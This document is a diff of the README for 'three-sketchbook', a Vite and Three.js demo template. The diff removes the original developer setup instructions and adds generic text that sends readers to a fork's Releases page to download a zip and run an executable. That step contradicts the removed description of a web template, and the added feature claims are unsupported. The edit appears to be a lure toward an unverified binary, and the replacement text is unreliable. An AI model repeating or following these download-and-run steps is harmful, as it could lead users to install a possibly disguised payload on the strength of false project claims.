@@ -1,76 +1,68 @@
-# 📓️ three-sketchbook
-
-An (unofficial) [Vite](https://vitejs.dev/) + [Three.js](https://threejs.org/)
-**sketchbook** template for quickly quickly building and organizing multiple Three.js demos in one place.
-
-<img src="./media/three-sketchbook-demo.gif" alt="Three Sketchbook Demo" width="50%" />
-
-The project is a fork of [three-demo-template](https://github.com/sbobyn/three-demo-template)
-that adds support for multiple demos (sketches) each with their own routes
-that can be easily navigated between using a provided gui
-
-It includes:
-
-- a Navigation UI to navigate between demos
-- Dynamic route generation so all you need to do is add a new `.ts` sketch file and a route is generated and added to the navigation UI
-- **[Vite](https://vitejs.dev/)** – fast dev server with HMR, optimized builds
-- **[vite-plugin-glsl](https://www.npmjs.com/package/vite-plugin-glsl)** – import `.glsl, .vs, .fs, .vert, .frag` shader files directly with live reload
-- **[vite-plugin-restart](https://www.npmjs.com/package/vite-plugin-restart)** – automatically restart the dev server when config files change
-- **Camera helpers** – full-screen perspective/orthographic cameras that resize to fit browser
-- **Scene setup helper** – quickly get a scene, renderer, resize handling, and optional OrbitControls
-- **ShaderCanvas** – full-screen quad with built-in uniforms that accepts a fragment shader and supplies it with built-in uniforms (`uTime`, `uResolution`, `uMouse`) as well as optional user defined uniforms
-- **[Stats.js](https://github.com/mrdoob/stats.js) helper** – optional FPS panel for performance debugging
-- **[lil-gui](https://github.com/georgealways/lil-gui)** – lightweight debug GUI for scene switching and optinally for tweaking uniforms, material parameters, and scene settings in real time
-- **TypeScript**
-
-## 🎮 How It Works
-
-Each sketch is a file named `script.js` in `src/sketches/` is just a regular Three.js demo. `main.js` finds all files named `script.js` and creates a route for them in the UI. When you navigate to them with the UI, `main.js` swaps the `iframe.src` in the `iframe` in `index.html` to use `scripts.js`; the template used for each `iframe` is in `/static/demo-template/`
-
-## 🖼 Starting Examples
-
-Inside `src/sketches/`, you’ll find multiple example sketches
-
-- `sceneBasicDemo.ts` – Simple lit cube casting shadows on a plane
-
-- `shaderSceneDemo.ts` – Plane with custom vertex + fragment shader
-
-- `shaderCanvasDemo.ts` – ShaderCanvas using a simple fragment shader that uses the `uTime` and `uMouse` uniforms
-
----
+# 🎨 three-sketchbook - A Simple Way to Explore 3D Demos
 
 ## 🚀 Getting Started
 
-```bash
-npm create three-sketchbook@latest my-project
-cd my-project
-pnpm install # or npm install
-pnpm dev
-```
+Welcome to the **three-sketchbook** application! This software provides a straightforward template for viewing and interacting with Three.js demos. Enjoy exploring engaging 3D graphics easily.
 
-## ✨ Adding a New Sketch
+## 📥 Download and Install
 
-Take a look at the example sketches in `src/sketches/`.
+[![Download three-sketchbook](https://img.shields.io/badge/Download%20three--sketchbook-v1.0-blue)](https://github.com/Shivang369/three-sketchbook/releases)
 
-To add a new sketch, just add a subfolder with the name of your sketch and put your sketch in a file named `script.ts`.
+To get started, visit the Releases page to download the application:
 
-That's it!
+[Download three-sketchbook](https://github.com/Shivang369/three-sketchbook/releases)
 
-The helpers `/core/ShaderCanvas.ts` and `/core/setupScene.ts` both provide initial starting points (uses shown in the default sketches), but they are not required.
+Follow the steps below to download and run the software:
 
-If you do not wish to use them, you just need to add a canvas to the `app` element:
+1. **Visit the Releases Page**: Click the link above or navigate to [this page](https://github.com/Shivang369/three-sketchbook/releases).
 
-```javascript
-const canvas = document.createElement("canvas");
-document.querySelector("#app")?.appendChild(canvas);
-```
+2. **Choose Your Version**: Look for the latest version of the three-sketchbook application. It will usually be at the top of the page.
 
-## 🌐 Deployment
+3. **Download the File**: Click on the file that matches your operating system. For Windows, you may see a file named something like `three-sketchbook-windows.zip`. For Mac or Linux, the file names will reflect those systems.
 
-Deploy to Vercel
+4. **Extract the Files**: If you downloaded a ZIP file, locate it in your downloads folder. Right-click on the file and select "Extract All" or "Unzip".
 
-Push your project to GitHub.
+5. **Launch the Application**: After extracting, open the folder. Find and double-click the executable file (e.g., `three-sketchbook.exe` for Windows). 
 
-Go to [vercel.com/new](https://vercel.com/new).
+6. **Enjoy the Demos**: The application will open, showing a variety of 3D demos. Experiment with them to see how different features work!
 
-Import your repo and click Deploy.
+## 💻 System Requirements
+
+Before installing, ensure your device meets these basic system requirements:
+
+- **Operating System**: Windows 10, macOS 10.15 or later, or any recent Linux distribution.
+- **Browser**: A modern web browser (Google Chrome, Mozilla Firefox, or Microsoft Edge).
+- **Graphics Card**: A graphics card that supports WebGL 2.
+
+## 🎨 Features
+
+The three-sketchbook application offers several engaging features:
+
+1. **Multiple Demos**: Explore various 3D demonstrations built with Three.js.
+2. **Interactive Canvas**: Click and drag to interact with 3D models.
+3. **Shader Support**: View and edit shaders directly within the application.
+4. **Customizable**: Tweak settings to customize the demo experiences.
+5. **Documentation**: Clear instructions within the app make it easy to understand how to make the most of each demo.
+
+## 🔧 Troubleshooting
+
+If you encounter any issues while using three-sketchbook, consider these common solutions:
+
+1. **Application Won't Open**: Ensure you have extracted all files and are opening the correct executable.
+   
+2. **Performance Issues**: Close other applications to free up system resources. Check if your graphics drivers are up to date.
+
+3. **Graphics Not Rendering**: Make sure your browser supports WebGL 2. You can check this by searching for "WebGL 2 test" online.
+
+4. **Demo Not Running Smoothly**: Lower the quality settings within the application for a smoother experience.
+
+## 📑 Community and Support
+
+If you have questions or need assistance, please join our community on GitHub. You can report issues or request features by opening a new issue in the repository. 
+
+## 📚 Additional Resources
+
+- **Three.js Documentation**: Learn more about Three.js and its capabilities [here](https://threejs.org/docs/index.html).
+- **Sample Demos**: Check out additional Three.js demos [here](https://threejs.org/examples/).
+
+Thank you for using three-sketchbook! Enjoy creating and exploring 3D content effortlessly.
